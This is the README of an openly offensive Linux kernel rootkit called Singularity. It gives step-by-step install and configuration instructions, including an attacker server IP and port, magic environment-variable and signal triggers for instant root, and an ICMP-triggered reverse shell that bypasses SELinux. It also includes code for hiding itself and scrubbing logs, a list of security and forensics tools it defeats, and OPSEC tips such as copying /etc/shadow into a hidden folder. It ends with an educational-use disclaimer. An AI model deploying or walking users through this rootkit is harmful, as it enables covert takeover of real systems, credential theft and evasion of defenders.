# Singularity - Stealthy Linux Kernel Rootkit

<img src="https://i.imgur.com/n3U5fsP.jpeg" alt="Singularity Rootkit" width="600"/>

> *"Shall we give forensics a little work?"*

**Singularity** is a powerful Linux Kernel Module (LKM) rootkit designed for modern 6.x kernels. It provides comprehensive stealth capabilities through advanced system call hooking via ftrace infrastructure.

**Full Research Article (outdated version)**: [Singularity: A Final Boss Linux Kernel Rootkit](https://blog.kyntra.io/Singularity-A-final-boss-linux-kernel-rootkit)

**EDR Evasion Case Study**: [Bypassing Elastic EDR with Singularity](https://matheuzsecurity.github.io/hacking/bypassing-elastic/)

---

## What is Singularity?

Singularity is a sophisticated rootkit that operates at the kernel level, providing:

- **Process Hiding**: Make any process completely invisible to the system
- **File & Directory Hiding**: Conceal files using pattern matching
- **Network Stealth**: Hide TCP/UDP connections, ports, and conntrack entries
- **Privilege Escalation**: Multiple methods to gain instant root access
- **Log Sanitization**: Filter kernel logs and system journals in real-time
- **Self-Hiding**: Remove itself from module lists and system monitoring
- **Remote Access**: ICMP-triggered reverse shell with automatic hiding
- **Anti-Detection**: Block eBPF tools, io_uring operations, and prevent module loading
- **Audit Evasion**: Drop audit messages for hidden processes at netlink level with statistics tracking
- **Memory Forensics Evasion**: Filter /proc/kcore, /proc/kallsyms, /proc/vmallocinfo
- **Cgroup Filtering**: Filter hidden PIDs from cgroup.procs
- **Syslog Evasion**: Hook do_syslog to filter klogctl() kernel ring buffer access
- **Debugfs Evasion**: Filter output of tools that read raw block devices
- **Conntrack Filtering**: Hide connections from /proc/net/nf_conntrack and netlink SOCK_DIAG/NETFILTER queries
- **SELinux Evasion**: Automatic SELinux enforcing mode bypass on ICMP trigger

---

## Features

- Environment-triggered privilege elevation via signals and environment variables
- Complete process hiding from /proc and monitoring tools
- Pattern-based filesystem hiding for files and directories
- Network connection concealment from netstat, ss, conntrack, and packet analyzers
- Advanced netlink filtering (SOCK_DIAG, NETFILTER/conntrack messages)
- Real-time kernel log filtering for dmesg, journalctl, and klogctl
- Module self-hiding from lsmod and /sys/module
- Automatic kernel taint flag normalization
- BPF syscall interception to prevent eBPF-based detection
- io_uring protection against asynchronous I/O bypass
- Prevention of new kernel module loading
- Log masking for kernel messages and system logs
- Evasion of standard rootkit detectors (unhide, chkrootkit, rkhunter)
- Automatic child process tracking and hiding via tracepoint hooks
- Multi-architecture support (x64 + ia32)
- Network packet-level filtering with raw socket protection
- Protection against all file I/O variants (read, write, splice, sendfile, tee, copy_file_range)
- Netlink-level audit message filtering with statistics tracking to evade auditd detection
- Cgroup PID filtering to prevent detection via `/sys/fs/cgroup/*/cgroup.procs`
- TaskStats netlink blocking to prevent PID enumeration
- /proc/kcore filtering to evade memory forensics tools (Volatility, crash, gdb)
- do_syslog hook to filter klogctl() and prevent kernel ring buffer leaks
- Block device output filtering to evade debugfs and similar disk forensics tools
- journalctl -k output filtering via write hook
- SELinux enforcing mode bypass capability for ICMP-triggered shells

---

## Installation

### Prerequisites

- Linux kernel 6.x (tested on 6.8.0-79-generic, 6.17.8-300.fc43.x86_64 and 6.12)
- Kernel headers for your running kernel
- GCC and Make
- Root access

### Quick Install
```bash
cd /dev/shm
git clone https://github.com/MatheuZSecurity/Singularity
cd Singularity
sudo bash setup.sh
sudo bash scripts/x.sh
cd ..
```

That's it. The module automatically:
- Hides itself from lsmod, /proc/modules, /sys/module
- Clears kernel taint flags
- Filters sensitive strings from dmesg, journalctl -k, klogctl
- Starts protecting your hidden files and processes

### Important Notes

**The module automatically hides itself after loading**

**There is no unload feature - reboot required to remove**

**Test in a VM first - cannot be removed without restarting**

---

## Configuration

### Set Your Server IP

**Edit `include/core.h`:**
```c
#define YOUR_SRV_IP "192.168.1.100"  // Change this
#define YOUR_SRV_IPv6 { .s6_addr = { [15] = 1 } }  // IPv6 if needed
```

**Edit `modules/icmp.c`:**
```c
#define SRV_PORT "8081"
```

### Customize Hidden Patterns

**Edit `include/hiding_directory_def.h`:**
```c
static const char *hidden_patterns[] = {
    "jira",
    "singularity",
    "obliviate",
    "matheuz",
    "zer0t",
    "your_pattern_here",
    NULL
};
```

### Change Hidden Port

**Edit `modules/hiding_tcp.c`:**
```c
#define PORT 8081  // Your hidden port
```

### Customize Magic Word

**Edit `modules/become_root.c`:**
```c
if (strstr(envs, "MAGIC=mtz")) {  // Change "mtz" to your string
    rootmagic();
}
```

### Change ICMP Magic Sequence

**Edit `modules/icmp.c`:**
```c
#define ICMP_MAGIC_SEQ 1337  // Change to your sequence
```

---

## CRITICAL: Randomize Your Hidden Names

**Default names like "singularity" are easily detected.** For more stealth, you MUST randomize all identifiers before compiling.

### Step 1: Generate Random Names

```bash
# Generate random hidden names
echo ".$(head -c 16 /dev/urandom | md5sum | head -c 10)"
# Example output: .7f2a9b1c8d

echo ".$(head -c 16 /dev/urandom | md5sum | head -c 10)"  
# Example output: .e5bb0ff518
```

### Step 2: Update hiding_directory_def.h

**Edit `include/hiding_directory_def.h`:**
```c
static const char *hidden_patterns[] = {
    ".7f2a9b1c8d",    // Your first random name
    ".e5bb0ff518",    // Your second random name
    NULL  
};
```

### Step 3: Update Log Filter

**Edit `modules/clear_taint_dmesg.c` - find and update `line_contains_sensitive_info()`:**
```c
notrace static bool line_contains_sensitive_info(const char *line) {
    const char *p;

    if (!line)
        return false;

    for (p = line; *p; p++) {
        switch (*p) {
        case '_':
            if (strncmp(p, "__builtin__ftrace", 17) == 0) return true;
            break;
        case 'c':
            if (strncmp(p, "create_trampoline+", 18) == 0) return true;
            if (strncmp(p, "constprop", 9) == 0) return true;
            if (strncmp(p, "clear_taint", 11) == 0) return true;
            break;
        case 'h':
            if (strncmp(p, "hook", 4) == 0) return true;
            break;
        case 't':
            if (strncmp(p, "taint", 5) == 0) return true;
            break;
        case 's':
            if (strncmp(p, ".7f2a9b1c8d", 11) == 0) return true;  // Your pattern
            break;
        case 'S':
            if (strncmp(p, "Singularity", 11) == 0) return true;
            break;
        case 'k':
            if (strncmp(p, "kallsyms_lookup_name", 20) == 0) return true;
            break;
        case 'f':
            if (strncmp(p, "filter_kmsg", 11) == 0) return true;
            if (strncmp(p, "fh_install", 10) == 0) return true;
            if (strncmp(p, "fh_remove", 9) == 0) return true;
            if (strncmp(p, "ftrace_helper", 13) == 0) return true;
            break;
        }
    }
    return false;
}
```

### Step 4: Update Disk Forensics Filter

**Edit `modules/hooks_write.c` - find and update `buffer_has_singularity()` and `sanitize_fs_tool_buffer_inplace()`:**
```c
static notrace bool buffer_has_singularity(const char *buf, size_t len)
{
    if (!buf || len == 0)
        return false;
    return memmem_ci(buf, len, ".7f2a9b1c8d", 11) != NULL;  // Your pattern
}

static notrace void sanitize_fs_tool_buffer_inplace(char *buf, size_t len)
{
    const size_t pattern_len = 11;  // Length of your pattern
    char *ptr;
    size_t remaining;
    void *found;
    
    if (!buf || len < pattern_len)
        return;
    
    ptr = buf;
    remaining = len;
    
    while (remaining >= pattern_len) {
        found = memmem_ci(ptr, remaining, ".7f2a9b1c8d", pattern_len);  // Your pattern
        if (!found)
            break;
        
        memset(found, ' ', pattern_len);
        ptr = (char *)found + pattern_len;
        remaining = len - (ptr - buf);
    }
}
```

### Step 5: Update Other Identifiers

**Edit `modules/icmp.c`:**
```c
#define PROC_NAME "kworker/0:1"  // Looks like a kernel worker or other name
#define ICMP_MAGIC_SEQ 48291     // Random sequence number
```

### Step 6: Compile and Deploy

```bash
make clean && make
sudo insmod singularity.ko
```

### Step 7: Create Hidden Workspace

```bash
# Create your hidden directory
cd /run
mkdir -p .7f2a9b1c8d
cp /etc/shadow .7f2a9b1c8d/shadow
cat .7f2a9b1c8d/shadow

# Your files are now:
# ✓ Hidden from ls, find, stat (VFS hooks)
# ✓ Hidden from debugfs (write hook filters output)
# ✓ Filtered from dmesg, journalctl -k (log sanitization)
```

---

## Usage

### Hide Processes
```bash
# Hide current shell
kill -59 $$

# Hide specific process
kill -59 <PID>
```

Process will be invisible to ps, top, htop, /proc, and all monitoring tools. All child processes are automatically tracked and hidden.

<p align="center">
<img src="https://i.imgur.com/wX2g459.png">
</p>

### Hide Files & Directories

Files matching your configured patterns are automatically hidden:
```bash
mkdir singularity
echo "secret" > singularity/data.txt

# Invisible to ls, find, locate
ls -la | grep singularity
# (no output)

# But you can still access it
cat singularity/data.txt
# secret

# cd is blocked for security
cd singularity
# bash: cd: singularity: No such file or directory
```

<p align="center">
<img src="https://i.imgur.com/a8eb6KS.png">
</p>

### Become Root

**Method 1: Environment Variable**
```bash
MAGIC=mtz bash
id  # uid=0(root)
```

**Method 2: Signal**
```bash
kill -59 $$
id  # uid=0(root)
```

<p align="center">
<img src="https://i.imgur.com/jCoi0LV.png">
</p>

### Hide Network Connections

Connections on your configured port are automatically hidden:
```bash
nc -lvnp 8081

# Invisible to all monitoring
ss -tulpn | grep 8081        # (no output)
netstat -tulpn | grep 8081   # (no output)
lsof -i :8081                # (no output)
cat /proc/net/nf_conntrack | grep 8081  # (no output)

# Even advanced netlink queries are filtered
ss -tapen | grep 8081        # (no output)
conntrack -L | grep 8081     # (no output)
```

Packets are dropped at raw socket level (tpacket_rcv) and hidden from:
- /proc/net/* interfaces (tcp, tcp6, udp, udp6)
- /proc/net/nf_conntrack
- Netlink SOCK_DIAG queries (used by ss, lsof)
- Netlink NETFILTER/conntrack messages (used by conntrack tool)

<p align="center">
<img src="https://i.imgur.com/WUuLu1q.png">
</p>

### ICMP Reverse Shell

Trigger a hidden reverse shell remotely with automatic SELinux bypass:

**1. Start listener:**
```bash
nc -lvnp 8081
```

**2. Send ICMP trigger:**
```bash
sudo python3 scripts/trigger.py <target_ip>
```

**3. Receive root shell** (automatically hidden with all child processes, SELinux enforcing mode bypassed if active)

<p align="center">
<img src="https://i.imgur.com/4bmbmwY.png">
</p>

---

## Protection Mechanisms

### Ftrace Control Protection

All attempts to disable ftrace are silently intercepted and blocked:
```bash
echo 0 > /proc/sys/kernel/ftrace_enabled       # Appears successful but does nothing
```

Protected syscalls: write, writev, pwrite64, pwritev, pwritev2, sendfile, sendfile64, splice, vmsplice, tee, copy_file_range, io_uring_enter (with intelligent per-PID caching)

### BPF Syscall Blocking

eBPF operations are intercepted and blocked:
- BPF_PROG_LOAD (tracepoint, kprobe, tracing, LSM, ext types)
- BPF_ITER_CREATE, BPF_PROG_GET_NEXT_ID, BPF_MAP_GET_NEXT_ID
- BPF_RAW_TRACEPOINT_OPEN, BPF_LINK_CREATE
- BPF_PROG_QUERY, BPF_OBJ_GET_INFO_BY_FD
- All BPF operations from hidden PIDs

### io_uring Protection

Protection against io_uring bypass in ftrace_enabled and tracing_on attempts with intelligent caching (1 second cache per PID to prevent repeated process scanning and reduce overhead)

### Log Sanitization

Real-time filtering of sensitive strings from all kernel log interfaces:

| Interface | Hook | Status |
|-----------|------|--------|
| `dmesg` | read hook on /proc/kmsg | ✅ Filtered |
| `journalctl -k` | write hook (output filtering) | ✅ Filtered |
| `klogctl()` / `syslog()` | do_syslog hook | ✅ Filtered |
| `/sys/kernel/debug/tracing/*` | read hook | ✅ Filtered |
| `/var/log/kern.log`, `syslog`, `auth.log` | read hook | ✅ Filtered |
| `/proc/kallsyms`, `/proc/kcore`, `/proc/vmallocinfo` | read hook | ✅ Filtered |
| `/proc/net/nf_conntrack` | read hook | ✅ Filtered |

Filtered keywords: taint, journal, singularity, Singularity, matheuz, zer0t, kallsyms_lookup_name, obliviate, hook, hooked_, constprop, clear_taint, ftrace_helper, fh_install, fh_remove

**Note**: Audit messages for hidden PIDs are dropped at netlink level with statistics tracking (get_blocked_audit_count, get_total_audit_count)

### Disk Forensics Evasion

Singularity hooks the write syscall to detect and filter output from disk forensics tools:

**How it works:**
1. Detects if process has a block device open (`/dev/sda`, `/dev/nvme0n1`, etc)
2. Detects debugfs-style output patterns (inode listings, filesystem metadata)
3. Sanitizes hidden patterns in-place (replaces with spaces to maintain buffer size/checksums)

```bash
# Hidden files are invisible even to raw disk analysis
debugfs /dev/sda3 -R 'ls -l /home/user/singularity'
#            (spaces where "singularity" was)

# The pattern is sanitized in the output buffer
# Checksums remain valid, no corruption
```

**Detected patterns:**
- `debugfs:` prefix
- Inode listings with parentheses
- `Inode count:`, `Block count:`, `Filesystem volume name:`
- `Filesystem UUID:`, `e2fsck`, `Inode:`

### Process Hiding Implementation

Complete hiding from syscalls and kernel interfaces:
- /proc/[pid]/* (openat, readlinkat blocked)
- getdents, getdents64 (directory listing filtered)
- stat, lstat, statx, newfstatat (metadata hidden)
- kill with signal 0 (returns ESRCH)
- getsid, getpgid, getpgrp (returns ESRCH)
- sched_getaffinity, sched_getparam, sched_getscheduler, sched_rr_get_interval (returns ESRCH)
- getpriority (returns ESRCH)
- sysinfo (process count adjusted)
- pidfd_open (returns ESRCH)
- TaskStats netlink queries (returns ESRCH)
- Cgroup PIDs filtered from cgroup.procs

Child processes automatically tracked via sched_process_fork tracepoint hook.

---

## Bypassed Security Tools

**Process Monitoring**: ps, top, htop, etc

**Filesystem**: ls, find, locate, stat, lstat, readlink

**Disk Forensics**: debugfs, e2fsck (output filtered via write hook)

**Memory Forensics**: Volatility, crash, gdb (via /proc/kcore filtering)

**Network**: netstat, ss, lsof, tcpdump, wireshark, conntrack, /proc/net/*

**Logs & Traces**: dmesg, journalctl -k, klogctl, strace, ltrace, ftrace, perf, bpftrace, bpftool, libbpf

**Rootkit Detectors**: unhide, chkrootkit, rkhunter

**Module Detection**: lsmod, modinfo, /sys/module, /proc/modules, kmod

**Modern Detection**: eBPF-based security tools (Tracee), io_uring-based monitors, and some Linux EDRs

---

## Evasion Techniques

### Use tmpfs for more Stealth
```bash
cd /dev/shm   # or /run
mkdir .hidden
# Work here - extra layer of protection
```

### Why tmpfs (/run, /dev/shm)?

While Singularity can hide files anywhere in the filesystem (even from debugfs), using tmpfs provides an **extra layer of protection**:

| Protection Layer | Regular Filesystem | tmpfs |
|-----------------|-------------------|-------|
| VFS hooks (ls, find, stat) | ✅ Hidden | ✅ Hidden |
| debugfs output filtering | ✅ Hidden | ✅ Hidden |
| Survives reboot | ✅ Yes | ❌ No (auto-cleanup) |
| Raw block device reads* | ⚠️ Possible | ❌ Nothing on disk |

*Some advanced tools may read disk blocks directly without going through the kernel's write path. Using tmpfs eliminates this attack vector entirely since files only exist in RAM.

**Recommendation**: Use tmpfs (`/run`, `/dev/shm`) for maximum stealth. Your files will be hidden by VFS hooks, filtered from debugfs output, AND have no disk footprint at all.

### Secure File Deletion
```bash
shred -vfz -n 10 sensitive_file
rm -f sensitive_file
```

### Persistence (Use it if you want, but be aware of the risk)

Don't use `load_and_persistence.sh` for stealth operations - module becomes visible in filesystem. Load manually each session: `sudo insmod singularity.ko`

### More OPSEC

1. Use tmpfs (/dev/shm, /run) for extra protection
2. Use unique, random names for everything
3. Customize all default strings before compilation
4. Use non-standard ports and sequences

---

## Syscall Hooks

| Syscall/Function | Module | Purpose |
|---------|--------|---------|
| getdents, getdents64 | hiding_directory.c | Filter directory entries, hide PIDs |
| stat, lstat, newstat, newlstat, statx, newfstatat | hiding_stat.c | Hide file metadata, adjust nlink |
| getpriority | hiding_stat.c | Hide priority queries for hidden PIDs |
| openat | open.c | Block access to hidden /proc/[pid] |
| readlinkat | hiding_readlink.c | Block symlink resolution |
| chdir | hiding_chdir.c | Prevent cd into hidden dirs |
| read, pread64, readv, preadv | clear_taint_dmesg.c | Filter kernel logs, kcore, kallsyms, cgroup PIDs, nf_conntrack |
| do_syslog | clear_taint_dmesg.c | Filter klogctl()/syslog() kernel ring buffer |
| sched_debug_show | clear_taint_dmesg.c | Filter scheduler debug output |
| write, writev, pwrite64, pwritev, pwritev2 | hooks_write.c | Block ftrace control + filter disk forensics + filter journalctl output |
| sendfile, sendfile64, copy_file_range | hooks_write.c | Block file copies to protected files |
| splice, vmsplice, tee | hooks_write.c | Block pipe-based writes to protected files |
| io_uring_enter | hooks_write.c | Block async I/O bypass with PID caching |
| kill, getuid | become_root.c | Root trigger + magic env detection |
| getsid, getpgid, getpgrp | become_root.c | Returns ESRCH for hidden PIDs |
| sched_getaffinity, sched_getparam, sched_getscheduler, sched_rr_get_interval | become_root.c | Returns ESRCH for hidden PIDs |
| sysinfo | become_root.c | Adjusts process count |
| pidfd_open | become_root.c | Returns ESRCH for hidden PIDs |
| tcp4_seq_show, tcp6_seq_show | hiding_tcp.c | Hide TCP connections from /proc/net |
| udp4_seq_show, udp6_seq_show | hiding_tcp.c | Hide UDP connections from /proc/net |
| tpacket_rcv | hiding_tcp.c | Drop packets at raw socket level |
| recvmsg | audit.c | Filter netlink SOCK_DIAG and NETFILTER messages |
| netlink_unicast | audit.c | Drop audit messages for hidden PIDs |
| bpf | bpf_hook.c | Block eBPF tracing operations |
| init_module, finit_module | hooking_insmod.c | Prevent module loading |
| icmp_rcv | icmp.c | ICMP-triggered reverse shell with SELinux bypass |
| taskstats_user_cmd | task.c | Block TaskStats queries for hidden PIDs |
| sched_process_fork (tracepoint) | trace.c | Track child processes |
| tainted_mask (kthread) | reset_tainted.c | Clear kernel taint flags |
| module_hide_current | hide_module.c | Remove from module lists and sysfs |

**Multi-Architecture Support**: x86_64 (`__x64_sys_*`) and ia32 (`__ia32_sys_*`, `__ia32_compat_sys_*`)

---

## Compatibility

**Tested on**: Kernel 6.8.0-79-generic ✅ | Kernel 6.12 ✅ | Kernel 6.17.8-300.fc43 ✅

**Architecture**: x86_64 (primary) | ia32 (full support)

**May not work on**: Kernels < 6.x | Kernels without ftrace support

**Always test in a VM first**

---

## The Plot

Unfortunately for some...

Even with all these filters, protections, and hooks, there are still ways to detect this rootkit.

But if you're a good forensic analyst, DFIR professional, or malware researcher, I'll let you figure it out on your own.

I won't patch for this, because it will be much more OP ;)

---

## Credits

**Singularity** was created by **MatheuZSecurity** (Matheus Alves)

- LinkedIn: [mathsalves](https://www.linkedin.com/in/mathsalves/)
- Discord: `kprobe`

**Join Rootkit Researchers**: Discord - [https://discord.gg/66N5ZQppU7](https://discord.gg/66N5ZQppU7)

### Code References

- [fuxSocy](https://github.com/iurjscsi1101500/fuxSocy/tree/main)
- [MatheuZSecurity/Rootkit](https://github.com/MatheuZSecurity/Rootkit)

### Research Inspiration

- [KoviD](https://github.com/carloslack/KoviD)
- [Basilisk](https://github.com/lil-skelly/basilisk)
- [GOAT Diamorphine rootkit](https://github.com/m0nad/Diamorphine)
- [Adrishya](https://github.com/malefax/Adrishya/blob/main/Adrishya.c#L158)

---

## Contributing

- Submit pull requests for improvements
- Report bugs via GitHub issues
- Suggest new evasion techniques
- Share detection methods (for research)

**Found a bug?** Open an issue or contact me on Discord: `kprobe`

---

**FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY**

Singularity was created as a research project to explore the limits of kernel-level stealth techniques. The goal is to answer one question: **"How far can a rootkit hide if it manages to infiltrate and load into a system?"**

This project exists to:
- Push the boundaries of offensive security research
- Help defenders understand what they're up against
- Provide a learning resource for kernel internals and evasion techniques
- Contribute to the security community's knowledge base

**I am not responsible for any misuse of this software.** If you choose to use Singularity for malicious purposes, that's on you. This tool is provided as-is for research, education, and authorized security testing only.

Test only on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal in most jurisdictions.

**Be a researcher, not a criminal.**
